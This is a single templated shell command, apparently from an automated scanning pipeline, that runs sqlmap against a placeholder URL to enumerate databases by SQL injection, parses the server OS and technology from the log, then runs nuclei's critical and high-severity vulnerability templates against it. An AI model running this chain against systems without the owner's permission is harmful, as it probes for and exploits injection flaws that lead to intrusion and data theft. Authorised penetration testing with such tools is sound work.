sqlmap -u "{url}" --batch --random-agent --dbs --log-file {output_file}.sqlmap && cat {output_file}.sqlmap | grep -oP 'available databases \[\d+\]:\s*\K[^
]+' | tr ',' '
' | sed 's/ //g' | sort -u > {output_file}.dbs.txt && cat {output_file}.sqlmap | grep -oP 'web server operating system: \K[^
]+' > {output_file}.os.txt && cat {output_file}.sqlmap | grep -oP 'web application technology: \K[^
]+' > {output_file}.tech.txt && echo "{url}" | nuclei -l - -s critical,high -silent -j --log-file {output_file}.nuclei.json && cat {output_file}.nuclei.json | jq -r '.template_id' | sort | uniq -c | sort -rn > {output_file}.template_stats.txt

